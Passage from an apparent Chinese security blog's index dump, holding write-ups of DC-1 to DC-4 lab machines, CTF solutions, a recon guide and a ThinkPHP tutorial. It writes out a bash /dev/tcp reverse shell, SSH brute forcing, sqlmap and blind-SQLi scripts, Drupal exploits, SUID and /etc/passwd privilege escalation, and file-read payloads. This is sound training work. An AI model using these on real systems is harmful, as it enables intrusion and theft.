那么我们反弹一个shell bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/192.168.182.137/2333+0&gt;%261&#39; 在home目录下发现jim用户,里面有个backup文件放了old-password,拿来爆破一下ssh， hydra -l jim -P jim.txt 192.168.182.144 ssh -s 22 成功爆出密码 连接ssh ssh jim@192.168.182.144 -p 22 提权使用sudo -l 搜索具备suid属性的文件 find / -perm -u=s -type f 2&gt;/dev/null 没有发现可利用的命令 查看一下目录下的文件 有一封邮件，去查看一下 发现了charles用户给jim用户他的密码,^xHhA&amp;hvim0y su charles成功登录charles用户 sudo -l 发现该用户有一个root权限的命令：teehee，查看该命令的使用方法： 有一个-a可以对指定文件进行追加，不覆盖，测试使用 然后我们就可以尝试在/etc/passwd文件下添加新的用户使这个用户具有root权限 abc::0:0:::/bin/bash 用户名：是否有密码保护：uid(root)：全称：家目录：登陆状态 成功添加 拿到flag","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-3","slug":"DC-3","date":"2021-02-15T05:51:29.000Z","updated":"2021-02-23T05:01:20.037Z","comments":false,"path":"2021/02/15/DC-3/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/15/DC-3/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.143 发现80端口是打开的,访问一下 用的Joomla模板 cms扫描使用joomscan扫描工具扫描Joomla相关配置内容、坚持已知漏洞等等 扫描后得知Joomla版本3.7.0，管理员登录页面，及一些可以访问的网站目录 cd joomscan perl joomscan.pl -u 发现版本为3.7.0 扫描出登入界面 : [+] admin finder [++] Admin page : http://192.168.182.143/administrator/ 漏洞探测// nmap --script=vuln 192.168.182.143 扫描得出CMS版本3.7.0 存在数据库注入漏洞以及漏洞编号 使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞，也可以发现一个sql注入漏洞 searchsploit Joomla 3.7.0 cp /usr/share/exploitdb/exploits/php/webapps/42033.txt jommla-370-sqli.txt cat Joomla-370-sqli.txt 查看漏洞的利用方法 漏洞利用数据库注入攻击sqlmap -u &quot;http://192.168.182.143/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 爆表名 sqlmap -u &quot;http://192.168.182.143/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables //探测表名 #_users 爆列 爆数据 John解密// vim 1.txt 创建一个用于放散列密码的文档1.txt // john --wordlist=rockyou.txt 1.txt john解密 // sudo john 1.txt --show 得出密文：snoopy 成功登录后台 Getshell在后台我们找到了可以修改的php代码,反弹shell 成功拿到shell 提权信息搜集 //uname -a //lsb_release -a 查看系统信息，发现Ubuntu版本16.04 转到kali查找漏洞 //searchsploit Ubuntu 16.04 // searchsploit 39772.txt -p //cp /usr/share/exploitdb/exploits/linux/local/39772.txt 39772.txt //cat 39772.txt 发现方法 Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip 发现提权漏洞 因为给出的地址无法连接,也没有在其他地方找到exp,很遗憾就到此结束了","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-2","slug":"DC-2","date":"2021-02-12T06:54:22.000Z","updated":"2021-03-30T13:36:17.535Z","comments":false,"path":"2021/02/12/DC-2/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/12/DC-2/","excerpt":"","text":"信息搜集主机发现使用nmap扫描该网段，发现dc-2的ip为192.168.182.140 但是访问提示dns解析错误 修改hosts文件 192.168.182.140 dc-2 然后出现网站 发现flag1 目录爆破提示使用cewl字典生成，但是并没有发现登录框，使用扫描器经行扫描 发现登录界面wp-login.php 暴力破解使用cewl扫描密码使用方法:https://www.freebuf.com/articles/network/190128.html 使用wpscan扫描用户名使用方法: https://www.freebuf.com/sectool/174663.html wpscan –url 192.168.182.140 将密码保存在user.txt文件中 然后使用 wpscan –url http://dc-2 -U user.txt -P pass2.txt 暴力破解，成功破解出密码 | Username: jerry, Password: adipiscing | Username: tom, Password: parturient 使用jerry成功找到flag2 提示失败,然后我们还有另外一个7744端口是开启的 ssh破解登录SSH 指定密钥，连接远程服务器。 ssh -i /root/.ssh/ido_sch_pro ido@192.168.1.111 -p 7744 如上， /root/.ssh/ido_sch_pro ：密钥文件路径 ido@192.168.1.111 ：需要连接的服务器用户名 &amp; IP -p 7744 ： 端口7744 使用hydra工具使用已生成的密码字典对已知的用户名进行ssh登录密码爆破，获得ssh登录用户：tom / parturient hydra -L user.txt -P pass.txt 192.168.182.140 ssh -s 7744 login: tom password: parturient ssh tom@192.168.182.140 -p 7744 成功登录 ls发现有个flag3.txt文件,尝试查看发现 但是发现vi可以使用 使用vi命令查看flag3.txt Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 提示切换用户 提权Restricted shell绕过http://www.const27.com/2020/07/03/rbash%E7%BB%95%E8%BF%87/ https://xz.aliyun.com/t/7642 https://www.freebuf.com/articles/system/188989.html https://mp.weixin.qq.com/s/3ae2NLq5pxURy6aMFon-hA 尝试发现vi可以使用 执行命令 vi 1 :set shell=/bin/sh :shell #添加环境变量 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin （设置环境变量） 使用vi提权获得可以正常执行命令 使用之前jerry爆出来的密码切换为jerry用户 查看flag4 Good to see that you’ve made it this far - but you’re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you’re on your own now. :-) Go on - git outta here!!!! 还差最后一个 git提权sudo -l #查看都可以使用root权限无密码的命令,发现git命令 sudo git -p –-help #提权 成功找到五个flag","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-1","slug":"靶机DC-1","date":"2021-02-09T06:55:37.000Z","updated":"2021-02-20T01:44:38.096Z","comments":false,"path":"2021/02/09/靶机DC-1/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/09/靶机DC-1/","excerpt":"","text":"信息搜集主机发现打开靶机，调成net模式 使用namp -sN 192.168.182.0/24 探测到主机 然后探测端口，发现80端口打开 访问80端口 发现下方写了使用Durpal模板,而且这个小插件也能进行指纹识别（谷歌应用商店可以搜到） 漏洞发现与利用漏洞查找使用Metasploit搜索Drupal $ sudo msfdb init &amp;&amp; msfconsole $ search Drupal 选择模块 然后挨着试,可以有限选择Rank为excellent的,且更新时间靠后的 这里我们用了2018年的 $ use exploit/unix/webapp/drupal_drupalgeddon2 $ show options $ set RHOSTS 192.168.192.139 $ exploit 或者 run 成功反弹shell 然后在该目录下发现了flag1.txt 每一个好的cms都需要一个配置文件,你也是 然后百度该cms的配置文件目录位置 /** * * flag2 * Brute force and dictionary attacks aren&#39;t the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */ *标志2 *暴力和字典攻击不是最好的选择 *获得访问权限的唯一方法（您将需要访问权限）。 *你能用这些证书做什么？ 然后还发现了数据库的账号跟密码 尝试连接一下数据库 meterpreter &gt; mysql -u dbuser -p 结果一直返回 Unknown command: mysql. 换一下壳 输入shell 然后输入命令发现有问题,然后看他们说的是因为这不是交互式shell，需要获取交互式shell 使用python反弹一个交互式shell，然后我们登陆数据库 再次进入shell下，输入python命令，发现靶机已安装python 2.7.3，通过pty.spawn()获得交互式shell meterpreter &gt; shell python -V python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 可以获取到密码密文 然后先去补补功课吧 这里就直接copy师傅们的了 方法一： 在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号，使用此方法简便了破解admin的密码，更直接 查看Drupal版本,确定Drupal版本为7.24 cat /var/www/includes/bootstrap.inc | grep VERSION msf &gt; searchsploit drupal #查找针对Drupal的攻击脚本 攻击脚本适用于7.31以下，所以适合7.24版本 利用drupal7.0版本漏洞增加有admin权限的用户：admin1/admin1 python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.220.130 -u admin1 -p admin1 查看users表，添加admin1成功 使用新添加的用户admin1/admin1登录网站，在content模块下，找到flag3 方法二： 使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的scripts下 使用加密脚本加密新密码123456，生成加密密文 ./scripts/password-hash.sh 123456 password: 123456 hash: $S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY 修改admin用户的密码，更新为新密码：123456 update drupaldb.users set pass=&quot;$S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY&quot; where uid=1; 使用用户admin/123456登录网站，在content模块下，找到flag3 然后获取提示 Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow. 特殊的PERMS可以帮助找到密码-但您需要-exec该命令来确定如何获取隐藏的内容。 Flag3提示词有perms、find、-exec、shadow共四个特殊提示词 应该要查看shadow文件，并使用find命令提权 使用find命令查找有特殊权限suid的命令 find / -perm -4000 使用find命令提权 find ./ aaa -exec &#39;/bin/sh&#39; \\; 查看/etc/shadow 文件，发现flag4用户，并且flag4用户可以登录并且有密码，所以存在flag4的家目录 cat /etc/shadow flag4用户密码可以使用ssh登录进行爆破，如下： wget http://www.openwall.com/john/j/john-1.8.0.tar.gz #下载John密码包 tar -xvf john-1.8.0.tar.gz #解压缩 cd john-1.8.0/ src #进入源码目录下 uname -a #查看当前系统版本 make linux-x86-64 #编译并指定当前的Linux系统版本 使用hydra+John密码包对flag4的密码进行爆破，爆破密码为：flag4/orange hydra -l flag4 -P john-1.8.0/run/password.lst ssh://192.168.220.130 -f -vV -o hydraflag4.ssh login: flag4 password: orange 使用flag4用户可以通过ssh登录系统 ssh flag4@192.168.220.130 密码：orange 进入flag4用户的家目录/home/flag4，找到flag4.txt文本文件，找到flag4 cd /home/flag4 cat flag4.txt Flag4: Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy. Or maybe it is? 你能用同样的方法来查找或访问根目录中的标志吗？ 可能。但也许不是那么容易。或许是这样？ 在flag4中提示在root根目录下存在，进入到root家目录/root下找到thefinalflag.txt文本文件 cd /root cat thefinalflag.txt thefinalflag: Well done!!!! Hopefully you’ve enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 做得好！！！！！ 希望你喜欢这个并学到了一些新的技能。 你可以让我知道你对这次小旅行的看法。 通过Twitter联系我-@dcau7 五个flag全部找到，并学习到使用msfconsole框架，及使用find命令找suid和提权 参考文章：https://blog.csdn.net/weixin_43583637/article/details/101542749 https://www.freebuf.com/articles/network/218073.html","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"信息搜集","slug":"信息搜集","date":"2021-02-08T07:28:22.000Z","updated":"2021-03-31T15:13:36.692Z","comments":true,"path":"2021/02/08/信息搜集/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/08/信息搜集/","excerpt":"","text":"搜索引擎Google Hacking符号（类似于正则匹配） -keyword 与关键词不相关 *KEYWORD* 与关键词相关 “KEYWORD” 强制搜索相关关键词（若里里面有两个词,必须两个词同时存在） site（搜索指定域名的网站）举例 site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索知乎跟web安全相关的网页 “sql注入” site:csdn.net 在csdn.net搜索跟sql注入相关的内容 “教程” site:pan.baidu.com 在百度网盘种搜索教程 filetype(指定文件类型) nmap filetype:pdf 查找nmap相关的pdf文件 “web安全” filetype:PPT 查找web安全相关PPT inurl(搜索url网址存在特定关键字的网页) inurl:php?id= 搜索网站URL中包含了php?id= inurl:/admin/login.php 搜索网站URL中包含了/admin/login.php inurl:login 搜索网站URL中包含了login intitle(搜索title存在特定关键字的网页) intitle:后台管理 filetype:php 搜索后台管理,php类型 intitle:index of “parent directory” 搜索根目录相关的索引目录信息 intitle:index of “password” 搜索密码相关的索引目录信息 intitle:index of “admin” 搜索后台管理界面 intext(搜索网页内容存在特定关键字的网页) intext:Powered by Discuz 搜索Discuz论坛相关的界面 intext:Powered by wordpress 搜索wordpress制作的博客网址 intext:Powered by *CMS 搜索*CMS相关的界面 intext:powered by xxx inurl:login 搜索此类网址的后台登录界面 Shodan Hacking除了可以搜索常见的web服务器,还能扫描防火墙、路由器、摄像头等一切联网的设备。放个简介,现在还用不上 ZoomEye HackingZoomEye(钟馗之眼),可以看做是”国产的Shodan”,由知道创宇出品 官网: https://www.zoomeye.org/ 目标扫描Nmap查用命令 命令 作用 -help 查看帮助 -sn 探测主机 -sS 探测服务 -O 判断系统 -sV 扫描具体服务的版本，比如80端口的apache版本 -A 综合扫描， 比如-O 跟-sV(如果你不想写-0跟-sV那就直按用-A即可) 脚本加载我们平时扫描默认使用的是 namp –script=default 192.168.182.0/24 然而namp还有很多脚本可以供我们使用,如: ​ 详细脚本信息可以查看https://nmap.org/book/nse-usage.html -O 判断是什么系统 -sV 版本检测 比如扫出了SSH端口 然后得出他的版本号 -A 意思就是使用所有 比如-O 跟-sV(如果你不想写-0跟-sV那就直按用-A即可) -P 扫描指定的请口-P 1-65535或P 80,8080,1433 -v 输出详细信息 -T4 扫描速度(1-5) 蜗牛，鬼鬼来索，有礼貌的，正常的，侵略性的-T就是正常的 -sS 二次握手 –exclude 排除主机或网络。 –excludefile 排除文件中的列表。 –host-timeout 10 设置扫描主机10秒 在10秒后还没接收响应那就会认为没开端口 -lt[list.txt] 如果你有大量的系统需要扫描 ,你可以将这些IP地址(或主机名)输入到一个文本文件中 –script afp-brute 加载脚本 -PS 选项来实施TCP SYN ping可绕防火墙 -PA 这种类型的扫描将只会扫描ACK包。可绕防火墙 -PU 扫描只会对目标进行udp ping扫描。这种类型的扫描会发送UDP包来获得一个响应。可绕防火墙 -PP 选项进行一个ICMP时问戳ping扫描 可绕防火墙 -PE 参数进行一个ICMP(Internet控制报文协议) 在指定的系统上输出ping,可绕防火墙 -Pn 不采用ping方式进行扫描 可绕防火墙 -sA 用于发现防火墙规则，比如扫到的端口是过滤的那么可以使用这个参数进行绕过。 OpenVAS下载后登录 https://127.0.0.1:9392/ sudo gvm-start //启动 sudo gvm-stop //停止 使用说明: https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/28.html 域名遍历DirBuster在kali中cd到/usr/share/wordlists/dirbuster，输入命令打开dirbuster 点击start开始扫描 详细介绍:https://blog.csdn.net/xiao1234oaix/article/details/108277427 ​ https://blog.csdn.net/weixin_42380348/article/details/100700889 御剑扫描 Layer子域名挖掘机 指纹识别Whatwebwhatweb -h 查看参数 -v输出详细参数 -a调节探测速度 httprint御剑指纹识别在线指纹识别http://whatweb.bugscaner.com/look/ https://www.yunsee.cn/","categories":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/categories/渗透/"}],"tags":[{"name":"信息搜集","slug":"信息搜集","permalink":"https://pp1ove.gitee.io/tags/信息搜集/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/categories/渗透/"}]},{"title":"ctfshow-萌新赛","slug":"ctfshow-萌新赛","date":"2021-02-07T14:07:29.000Z","updated":"2021-02-08T05:01:44.323Z","comments":true,"path":"2021/02/07/ctfshow-萌新赛/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/07/ctfshow-萌新赛/","excerpt":"","text":"给她打开： .git源码泄露，直接用githack扫描题目地址+/.git发现确实如此。 &lt;?php $pass=sprintf(&quot;and pass=&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;])); $sql=sprintf(&quot;select * from user where name=&#39;%s&#39;$pass&quot;,addslashes($_GET[&#39;name&#39;])); ?&gt; 本来想的是宽字节注入,但是不存在宽字节注入 然后这里有一个sprintf函数没有见过,就去百度了一下用法和相关漏洞 https://www.cnblogs.com/qingwuyou/p/10687463.html 然后sprintf()注入原理为： 这里利用的原理是%1$\\为空，所以我们构造%1$&#39;单引号前的转义符会被置空。从而实现单引号逃逸 于是构造SQL语句为 ?name=admin&amp;pass=%1$&#39; or 1=1--+ 然后到了一个界面 查看源代码 而且发现 cookie file=666c61672e747874 转成字符串发现是flag.txt 查看flag.txt文件 访问flag.txt对比一下，发现有相同的部分，推测这里应该有个文件读取或文件包含： 然后将cookie里的file给删除，发现确实有file_get_content()函数 直接构造/flag不行，用php://filter/convert.base64-encode/source=/flag提示base64不行。那么可以用rot13试试： payload: php://filter/read=string.toupper|string.rot13/resource=/flag 然后解码，再转换为小写 然后还看到羽师傅们有其他解法 布尔盲注 既然flag在/flag中，我们试试用load_file(/flag)，先将/flag转为16进制 payload:name=39&amp;pass=1%1$c or if(ascii(substr((select load_file(0x2f666c6167)),1,1))=102,sleep(3),1)--+ 这里给出盲注脚本 import requests url=&quot;https://1cde46a1-34ca-458b-82f4-f6e905716d31.chall.ctf.show/?name=39&amp;pass=1%1$c or &quot; l=&quot;&quot; s=&quot;0123456789abcdefghijklmnopqrstuvwxyz-{}&quot; for i in range(1,50): print(&quot;*&quot;) for j in s: u=url+&quot;if(ascii(substr((select load_file(0x2f666c6167)),&quot;+str(i)+&quot;,1))=&quot;+str(ord(j))+&quot;,sleep(3),1)--+&quot; #print(u) try: r = requests.get(u,timeout=(2.5,2.5)) #print(r.text) except: l+=j print(l) break 签到题&lt;?php if(isset($_GET[&#39;url&#39;])){ system(&quot;curl https://&quot;.$_GET[&#39;url&#39;].&quot;.ctf.show&quot;); }else{ show_source(__FILE__); } ?&gt; 命令执行 ;ls; ;cat flag; 假赛生&lt;?php session_start(); include(&#39;config.php&#39;); if(empty($_SESSION[&#39;name&#39;])){ show_source(&quot;index.php&quot;); }else{ $name=$_SESSION[&#39;name&#39;]; $sql=&#39;select pass from user where name=&quot;&#39;.$name.&#39;&quot;&#39;; echo $sql.&quot;&lt;br /&gt;&quot;; system(&#39;4rfvbgt56yhn.sh&#39;); $query=mysqli_query($conn,$sql); $result=mysqli_fetch_assoc($query); if($name===&#39;admin&#39;){ echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;; if(isset($_GET[&#39;c&#39;])){ preg_replace_callback(&quot;/\\w\\W*/&quot;,function(){die(&quot;not allowed!&quot;);},$_GET[&#39;c&#39;],1); echo $flag; }else{ echo &quot;you not admin&quot;; } } } ?&gt; 然后提示有registerer.php和login.php,发现可以注册账户和登录 注册用户 admin空格 然后尝试使用admin登录,成功登录（这里绕了点小弯,我接着用admin空格登录，结果发现不行，以为这个方法行不通） 然后就是通过正则匹配 c=!成功通过 c=空也可以","categories":[{"name":"萌新赛","slug":"萌新赛","permalink":"https://pp1ove.gitee.io/categories/萌新赛/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://pp1ove.gitee.io/tags/ctfshow/"}],"keywords":[{"name":"萌新赛","slug":"萌新赛","permalink":"https://pp1ove.gitee.io/categories/萌新赛/"}]},{"title":"thinkphp6.0","slug":"thinkphp6-0","date":"2021-02-07T02:21:15.000Z","updated":"2021-02-07T08:08:07.942Z","comments":false,"path":"2021/02/07/thinkphp6-0/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/07/thinkphp6-0/","excerpt":"","text":"0x01thinkphp6.0的安装参考 https://www.kancloud.cn/manual/thinkphp6_0/1037479 https://www.cnblogs.com/it-abu/p/13493424.html 0x02开发规范一．开发规范一．开发规范 ThinkPHP6.0 遵循的是 PSR-2 的命名规范和 PSR-4 的自动加载； 目录和文件的规范如下： a. 目录名（小写+下划线）； b. 类库和函数文件统一以.php 为后缀； c. 类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径 一致； d. 类（包含接口和 Trait）文件采用驼峰式命名（首字母大写），其它采用 小写+下划线命名； e. 类名（包括接口和 Trait）和文件名保持一致，统一采用驼峰式命名 （首字母大写）； 函数和类、属性命名规范如下： a. 类的命名采用驼峰法（首字母大写），如：User、UserType； b. 函数的命名使用小写字母和下划线（小写字母开头）的方式， 如：get_client_ip； c. 方法的命名使用驼峰法（首字母小写），如：getUserName； d. 属性的命名使用驼峰法（首字母小写），如：tableName； e. 特例：以双下划线__打头的函数或方法作为魔术方法，如： call 和 autoload； 常量与配置的规范如下： a. 常量以大写字母和下划线命名，如：APP_PATH； b. 配置参数以小写字母和下划线命名，如：url_convert； c. 环境变量定义使用大写字母和下划线命名，如：APP_DEBUG； 数据表和字段的规范如下： a. 数据表和字段采用小写加下划线方式命名； b. 并注意字段名不要以下划线开头，如： think_user 表和 user_name c. 字段不建议使用驼峰和中文作为数据表及字段命名； 二．目录结构 ThinkPHP6.0 支持多应用模式部署，app 是应用目录； 默认情况下，是采用的单模式，如下图结构： 多应用模式下，结构如下图： 上图中，app_name 可以有多个，即多应用模式； 在目录结构上，只确保对外可访问的仅 public 目录； 在 app 目录中，还提供了一些文件，这些文件将在后面逐步讲到； 0x03开启调试与配置文件 通过命令行安装的 TP6.0，会自动在根目录生成一个.example..env 文件； 这个.env 文件是环境配置文件，我们只要删除前面的.example.即可生效； 此时，刷新页面，右下角会出现 Trace 调试小图标，说明调试开启了； 查看.env 文件，打开调试的环境变量为 APP_DEBUG = true，false 关闭； 0x04URL访问模式 ThinkPHP 框架非常多的操作都是通过 URL 来实现的； 多应用：http://serverName/index.php/应用/控制器/操作/参数/值…； 单应用：http://serverName/index.php/控制器/操作/参数/值…； 由于 TP6.0 默认是单应用模式，多应用需要作为扩展安装，避免混乱暂时搁置； http://serverName 是域名地址，比如 127.0.0.1:8000 或 localhost/tp6/ index.php 这个文件，是根目录下 public/下的 index.php(入口文件)； 控制器：app 目录下有一个 controller 控制器目录的 Test.php(控制器)； Test.php 控制器的类名也必须是 class Test，否则错误； 操作就是控制器类里面的方法，比如：index(默认免写)或 hello(必写)； 那么完整形式为： a. http://localhost/tp6/public/index.php/test/hello/value/world b. http://127.0.0.1:8000/index.php/test/hello/value/world class Test { public function index() { return &#39;test&#39;; } public function hello($value = &#39;&#39;) { return &#39;hello &#39;.$value; } } public/index.php 中的 index.php 可以省略，只要设置 URL 重写即可； httpd.conf 配置文件中加载了 mod_rewrite.so 模块； AllowOverride None 将 None 改为 All； 此时，路径变更为： http://localhost/tp6/public/test/hello/value/world 二．**URL 兼容模式** 上个要点已经了解了 URL 所有访问规则，通过创建 Test 控制器更加了解； 如果上面那种形式的 URL 不支持的话，可以使用兼容模式的方式来访问： http://localhost/tp6test3/public/?s=test/hello/value/world 0x05控制器定义一．控制器定义 控制器，即 controller，控制器文件存放在 controller 目录下； 如果想改变系统默认的控制器文件目录，可以在 config 下 route.php 配置： ‘controller_layer’ =&gt; ‘controller123’, 类名和文件名大小写保持一致，并采用驼峰式（首字母大写）； namespace app\\controller; class Test {…} 从上面两段代码得知 Test.php 的实际位置为：app\\controller\\Test.php 在 Test 类创建两个方法 index(默认)和 hello，访问 URL 如下： http://localhost/tp6/public/test/ http://localhost/tp6/public/test/hello 那么如果创建的是双字母组合，比如 class HelloWorld，访问 URL 如下： http://localhost/tp6test3/public/helloworld http://localhost/tp6test3/public/hello_world 如果你想避免引入同类名时的冲突，可以 route.php 设置控制器后缀： ‘controller_suffix’ =&gt; true, 此时，Test.php 就必须改成 TestController.php，并类名也需要增加后缀； 二．渲染输出 ThinkPHP 直接采用方法内 return 返回的方式直接就输出了； 使用 json 输出，直接采用 json 函数； $data = array(‘a’=&gt;1, ‘b’=&gt;2, ‘c’=&gt;3); return json($data); 不推荐使用 die、exit 等 PHP 方法中断代码执行，推荐助手函数 halt()； halt(‘中断测试’) 0x06基础.空.多级控制器一．基础控制器 一般来说，创建控制器后，推荐继承基础控制器来获得更多的方法； 基础控制器仅仅提供了控制器验证功能，并注入了think\\App和think\\Request； 这两个对象后面会有章节详细讲解，下面我们继承并简单使用一下； 二．空控制器 在单应用模式下，我们可以给项目定义一个 Error 控制器类，来提醒错误； 三．多级控制器 所谓多级控制器，就是在控制器 controller 目录下再建立目录并创建控制器； 我们在 controller 目录下建立 group 目录，并创建 Blog.php 控制器； 而此时，我们需要访问的地址为：http://localhost:8000/group.blog 0x07连接数据库与模型初探一．连接数据库 ThinkPHP 采用内置抽象层将不同的数据库操作进行封装处理； 数据抽象层基于 PDO 模式，无须针对不同的数据库编写相应的代码； 使用数据库的第一步，就是连接你的数据库； 在根目录的 config 下的 database.php 可以设置数据库连接信息； 大部分系统已经给了默认值，你只需要修改和填写需要的值即可； 本地测试，会优先采用.env 的配置信息，我们和 database 配置对应上即可； ‘type’ =&gt; Env::get(‘database.type’, ‘mysql’), ‘hostname’ =&gt; Env::get(‘database.hostname’, ‘127.0.0.1’), ‘database’ =&gt; Env::get(‘database.database’, ‘grade’), ‘username’ =&gt; Env::get(‘database.username’, ‘root’), ‘password’ =&gt; Env::get(‘database.password’, ‘123456’), ‘hostport’ =&gt; Env::get(‘database.hostport’, ‘3306’), ‘charset’ =&gt; Env::get(‘database.charset’, ‘utf8’), ‘prefix’ =&gt;Env::get(‘database.prefix’, ‘tp_’), 可以通过删除改变.env 的配置，或删除.env 来验证 database 的执行优先级； 在 database.php 配置中，default 表示设置默认的数据库连接； connections 配置数据库连接信息，可以是多个数据库，便于切换； 默认的数据库连接名称为：’mysql’，再复制一组数据库链接信息：’demo’切换； 创建一个用于测试数据连接的控制器：DataTest.php； namespace app\\controller; use think\\facade\\Db; class DataTest { public function index() { $user = Db::table(&#39;tp_user&#39;)-&gt;select(); //$user = Db::connect(&#39;mysql&#39;)-&gt;table(&#39;tp_user&#39;)-&gt;select(); return json($user); } public function demo() { $demo = Db::connect(&#39;demo&#39;)-&gt;table(&#39;tp_user&#39;)-&gt;select(); return json($demo); } } 二．模型初探 在 app 目录下创建一个 model 目录，并创建 User.php 的模型类； namespace app\\model; use think\\Model; class User extends Model { protected $connection = &#39;demo&#39;; } User 继承模型基类，即可实现数据调用，后面章节会详解讲解； 而受保护的字段$connection，则是切换到 demo 数据库； 控制器端的调用方式如下，具体原理，后面模型章节会详解； public function getUser() { $user = User::select(); return json($user); } 0x08数据库的数据查询一．单数据查询 Db::table()中 table 必须指定完整数据表（包括前缀）； 如果希望只查询一条数据，可以使用 find()方法，需指定 where 条件； Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 27)-&gt;find() Db::getLastSql()方法，可以得到最近一条 SQL 查询的原生语句； SELECT * FROM `tp_user` LIMIT 1 没有查询到任何值，则返回 null； 使用 findOrFail()方法同样可以查询一条数据，在没有数据时抛出一个异常； Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;findOrFail() 使用 findOrEmpty()方法也可以查询一条数据，但在没有数据时返回一个空数组； Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;findOrEmpty(); 二．数据集查询 想要获取多列数据，可以使用 select()方法； Db::table(&#39;tp_user&#39;)-&gt;select(); SELECT * FROM `tp_user` 多列数据在查询不到任何数据时返回空数组，使用 selectOrFail()抛出异常； Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;selectOrFail(); 在 select()方法后再使用 toArray()方法，可以将数据集对象转化为数组； $user = Db::table(&#39;tp_user&#39;)-&gt;select()-&gt;toArray(); dump($user); 当在数据库配置文件中设置了前缀，那么我们可以使用 name()方法忽略前缀； Db::name(&#39;user&#39;)-&gt;select(); 三．其它查询 通过 value()方法，可以查询指定字段的值（单个），没有数据返回 null； Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, **27**)-&gt;value(&#39;username&#39;); 通过 colunm()方法，可以查询指定列的值（多个），没有数据返回空数组； Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;); 可以指定 id 作为列值的索引； Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;, &#39;id&#39;); 如果处理的数据量巨大，成百上千那种，一次性读取有可能会导致内存开销过大； 为了避免内存处理太多数据出错，可以使用 chunk()方法分批处理数据； 比如，每次只处理 100 条，处理完毕后，再读取 100 条继续处理； Db::table(&#39;tp_user&#39;)-&gt;chunk(3, function($users) { foreach ($users as $user) { dump($user); } echo 1; }; 可以利用游标查询功能，可以大幅度减少海量数据的内存开销，它利用了 PHP 生 成器特性。每次查询只读一行，然后再读取时，自动定位到下一行继续读取； $cursor = Db::table(&#39;tp_user&#39;)-&gt;cursor(); foreach($cursor as $user){ dump($user); } 0x09数据库的链式查询一．查询规则 前面课程中我们通过指向符号“-&gt;”多次连续调用方法称为：链式查询； 当 Db::name(‘user’)时，返回查询对象(Query)，即可连缀数据库对应的方法； 每次执行一个数据库查询方法时，比如 where()，还将返回查询对象(Query)； 只要还是数据库对象，那么就可以一直使用指向符号进行链式查询； 再利用 find()、select()等方法返回数组(Array)或数据集对象(Colletion)； 而 find()和 select()是结果查询方法（放在最后），并不是链式查询方法； Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 27)-&gt;order(&#39;id&#39;, 